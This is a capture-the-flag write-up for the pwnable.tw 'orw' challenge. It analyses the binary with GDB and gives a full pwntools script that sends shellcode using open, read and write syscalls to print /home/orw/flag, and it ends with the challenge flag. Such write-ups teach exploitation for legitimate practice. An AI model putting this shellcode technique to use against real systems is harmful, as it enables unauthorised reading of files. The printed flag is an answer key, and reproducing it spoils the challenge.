# Orw:

## Description: 
```Read the flag from /home/orw/flag.

Only open read write syscall are allowed to use.

nc chall.pwnable.tw 10001

```
## GDB dump:

We can see that it is a 32 bit executable, dynamically linked non-stripped file. 
```
   0x08048571 <+41>:	push   0xc8
   0x08048576 <+46>:	push   0x804a060
   0x0804857b <+51>:	push   0x0
   0x0804857d <+53>:	call   0x8048370 <read@plt>
   0x08048582 <+58>:	add    esp,0x10
   0x08048585 <+61>:	mov    eax,0x804a060
   0x0804858a <+66>:	call   eax
   0x0804858c <+68>:	mov    eax,0x0
```

Once we debug using gdb, we see 2 functions defined. The main function reads our input into 'shellcode' i.e at '0x804a060' and then at line 66, we can see a call to eax. since eax contains the address where our shellcode was stored, it's easy to imagine that we need to write a shellcode using only read, write and open syscalls, and this shellcode will be executed by the program itself as the call to eax is made.

To write the shellcode, we can only choose read, write and open syscalls. We are told that the flag is in ```/home/orw/flag``` directory. So we will first puush these arguments onto the stack, use the open syscall to reach flag through this directory, read and then write.

## Exploit:

```
from pwn import *

context(os='linux', arch='i386')
context.log_level = 'debug'
r = remote('chall.pwnable.tw', 10001)

shellcode = ''

# open syscall
shellcode += 'push %d\n' % u32('ag\0\0')
shellcode += 'push %d\n' % u32('w/fl')
shellcode += 'push %d\n' % u32('e/or')
shellcode += 'push %d\n' % u32('/hom')
shellcode += 'mov edx, 0x0\n'
shellcode += 'mov ecx, 0x0\n'
shellcode += 'mov ebx, esp\n'
shellcode += 'mov eax, 0x5\n'
shellcode += 'int 0x80\n'

# read syscall
shellcode += 'push 0x80\n'
shellcode += 'pop edx\n'
shellcode += 'mov ecx, esp\n'
shellcode += 'mov ebx, eax\n'
shellcode += 'mov eax, 0x3\n'
shellcode += 'int 0x80\n'

# write syscall
shellcode += 'mov edx, eax\n'
shellcode += 'mov ecx, esp\n'
shellcode += 'mov ebx, 0x0\n'
shellcode += 'mov eax, 0x4\n'
shellcode += 'int 0x80\n'

r.recvuntil('Give my your shellcode:')
log.info(disasm(asm(shellcode)))
r.sendline(asm(shellcode))
r.recvall()
#r.interactive()
```

## Flag:
```FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}```
